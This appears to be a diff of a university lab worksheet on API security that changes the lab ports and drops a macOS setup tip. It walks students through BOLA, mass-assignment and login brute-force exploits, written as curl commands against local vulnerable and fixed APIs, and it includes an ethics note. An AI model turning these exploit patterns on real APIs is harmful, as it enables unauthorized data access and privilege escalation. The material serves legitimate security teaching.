@@ -4,7 +4,7 @@
 > **Aligned:** OWASP API Security Top 10:2023 — API1 BOLA · API3 Broken Object Property Level Auth (Mass Assignment) · API4 Unrestricted Resource Consumption
 > **Signature game:** 🥷 crAPI Raid
 >
-> **Ethics note:** Run exploits **only** against the lab targets shipped here (`vulnerable_api.py` on `:5000`) or your own OWASP crAPI instance. Never test BOLA, mass assignment, or brute-force against systems you do not own or are not explicitly authorized to test.
+> **Ethics note:** Run exploits **only** against the lab targets shipped here (`vulnerable_api.py` on `:8080`) or your own OWASP crAPI instance. Never test BOLA, mass assignment, or brute-force against systems you do not own or are not explicitly authorized to test.
 
 ## Part 1 — Student Information
 
@@ -29,38 +29,37 @@
 **Environment setup**
 ```bash
 cd labs/week10-api-security
-docker compose up         # INSECURE API on :5000, SECURE API on :5001
+docker compose up         # INSECURE API on :8080, SECURE API on :8081
 # Seeded users: alice(id 1) bob(id 2) carol(id 3, admin, balance 9999)
 ```
-> 💡 **macOS:** if this fails with `port 5000 … address already in use`, turn off *System Settings → General → AirDrop & Handoff → AirPlay Receiver*, or run inside the course VM (no conflict).
 
 **What to submit per task:** the exact command(s) + raw response/HTTP status, a screenshot, and a 2–3 sentence mitigation note mapping the bug to its OWASP API id.
 
 ### Task 0 — Onboarding (15 min)
-Confirm both APIs respond: `curl http://localhost:5000/` and `curl http://localhost:5001/`. Note which port is insecure. Record the three seeded users.
+Confirm both APIs respond: `curl http://localhost:8080/` and `curl http://localhost:8081/`. Note which port is insecure. Record the three seeded users.
 **Deliverable:** both root responses + the user table.
 
 ### Task 1 — BOLA: read another user's orders (35 min)
 **Goal:** Read carol's (admin) orders without being carol — API1:2023.
 **Steps:**
-1. `curl http://localhost:5000/api/users/3/orders` — note you receive the "Server rack" order with no auth.
-2. Iterate the id: `curl http://localhost:5000/api/users/2/orders`.
-3. On the secure API observe the ladder: `curl -i http://localhost:5001/api/users/3/orders` (401), `curl -i -H "X-User-Id: 1" http://localhost:5001/api/users/3/orders` (403), `curl -i -H "X-User-Id: 1" http://localhost:5001/api/users/1/orders` (200).
+1. `curl http://localhost:8080/api/users/3/orders` — note you receive the "Server rack" order with no auth.
+2. Iterate the id: `curl http://localhost:8080/api/users/2/orders`.
+3. On the secure API observe the ladder: `curl -i http://localhost:8081/api/users/3/orders` (401), `curl -i -H "X-User-Id: 1" http://localhost:8081/api/users/3/orders` (403), `curl -i -H "X-User-Id: 1" http://localhost:8081/api/users/1/orders` (200).
 **Deliverable:** the leaked order JSON + the 401/403/200 transcript + mitigation note.
 
 ### Task 2 — Mass assignment: self-promote to admin (30 min)
 **Goal:** Smuggle `is_admin` + `balance` into user creation — API3:2023.
 **Steps:**
-1. `curl -X POST http://localhost:5000/api/users -H "Content-Type: application/json" -d '{"username":"mallory","password":"x","is_admin":true,"balance":1000000}'`
+1. `curl -X POST http://localhost:8080/api/users -H "Content-Type: application/json" -d '{"username":"mallory","password":"x","is_admin":true,"balance":1000000}'`
 2. Confirm the response echoes `"is_admin": true, "balance": 1000000`.
-3. Repeat against `:5001` and confirm the smuggled fields are forced to `is_admin:false, balance:0`.
+3. Repeat against `:8081` and confirm the smuggled fields are forced to `is_admin:false, balance:0`.
 **Deliverable:** both responses side by side + mitigation note (allow-list in `solution_api.py`).
 
 ### Task 3 — Unrestricted resource consumption: brute-force login (25 min)
 **Goal:** Show `/api/login` has no throttle — API4:2023.
 **Steps:**
-1. Run the brute-force loop from `attack.md` against `:5000` (guesses incl. `alice123`) — all attempts processed.
-2. On `:5001` loop 7 times: `for i in $(seq 1 7); do curl -s -o /dev/null -w "%{http_code}\n" -X POST http://localhost:5001/api/login -H "Content-Type: application/json" -d '{"username":"alice","password":"wrong"}'; done`
+1. Run the brute-force loop from `attack.md` against `:8080` (guesses incl. `alice123`) — all attempts processed.
+2. On `:8081` loop 7 times: `for i in $(seq 1 7); do curl -s -o /dev/null -w "%{http_code}\n" -X POST http://localhost:8081/api/login -H "Content-Type: application/json" -d '{"username":"alice","password":"wrong"}'; done`
 3. Confirm the 6th/7th attempt returns `429`.
 **Deliverable:** the `401 401 401 401 401 429 429` sequence + mitigation note.
 
@@ -71,7 +70,7 @@ Against your own OWASP crAPI instance (`git clone https://github.com/OWASP/crAPI
 ### Task 5 — Defend / fix it (20 min)
 **Goal:** Explain the fixes using the secure reference `solution_api.py`.
 **Steps:** Read the three `# --- FIX ...` blocks. For each, quote the line(s) that defeat your Task 1–3 exploit: the per-object ownership check (`caller["id"] != uid and not caller["is_admin"]`), `ALLOWED_CREATE_FIELDS` binding, and the `RATE_LIMIT=5 / RATE_WINDOW=60` limiter.
-**Deliverable:** for each of API1/API3/API4 — the exploit that worked on `:5000`, the line in `solution_api.py` that blocks it, and the new HTTP status on `:5001`.
+**Deliverable:** for each of API1/API3/API4 — the exploit that worked on `:8080`, the line in `solution_api.py` that blocks it, and the new HTTP status on `:8081`.
 
 ## Part 4 — Reflection
 
